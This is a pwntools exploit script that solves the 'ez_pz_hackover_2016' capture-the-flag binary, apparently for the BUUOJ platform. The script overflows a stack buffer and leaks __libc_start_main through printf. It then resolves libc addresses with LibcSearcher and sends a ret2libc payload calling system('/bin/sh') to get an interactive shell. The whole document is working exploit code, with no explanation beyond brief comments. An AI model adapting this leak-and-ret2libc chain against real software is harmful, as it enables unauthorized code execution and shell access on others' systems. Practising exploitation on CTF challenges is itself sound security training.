#!/usr/bin/python3.6
from pwn import *
from LibcSearcher import LibcSearcher


filename = './ez_pz_hackover_2016'
e = ELF(filename)
p = process(filename)
# p = remote("node3.buuoj.cn", 26524)

log.level = 'DEBUG'
for k, v in e.got.items():
    log.debug(f'got:{k}={hex(v)}')

chall = e.sym['chall']
printf_plt, c_func_got = e.plt['printf'], e.got['__libc_start_main']
log.info(f'put:plt={hex(printf_plt)}, __libc_start_main:got={hex(c_func_got)}')

# TODO HINT: -0x32(%ebp) => 0x32+4 is a false offset
# breakpoint at *vuln(buffer, 0x400)+0:
#   memory starting from the address of the first argument is copied to destination
#   offset of ra = 0x32+4 = buffer - (ebp+8) + 8 + x
ra_offset = 0x12
pivot = b'crashme\x00'
payload_leak = pivot + b'a'*ra_offset + p32(printf_plt) + p32(chall) + p32(c_func_got)

content = p.recvuntil(b'>')
log.debug(content)

p.sendline(payload_leak)
p.recvuntil(b'crashme!\n')
c_func_addr = u32(p.recv(4))
log.success(f'__libc_start_main={hex(c_func_addr)}')

searcher = LibcSearcher()
searcher.add_condition('__libc_start_main', c_func_addr)
base_addr = c_func_addr - searcher.dump('__libc_start_main')
system_addr = base_addr + searcher.dump('system')
bin_sh_addr = base_addr + searcher.dump('str_bin_sh')

log.info(f'base={hex(base_addr)}, system={hex(system_addr)}, /bin/sh={hex(bin_sh_addr)}')
payload = pivot + b'a'*ra_offset + p32(system_addr) + p32(chall) + p32(bin_sh_addr)
p.sendline(payload)
p.interactive()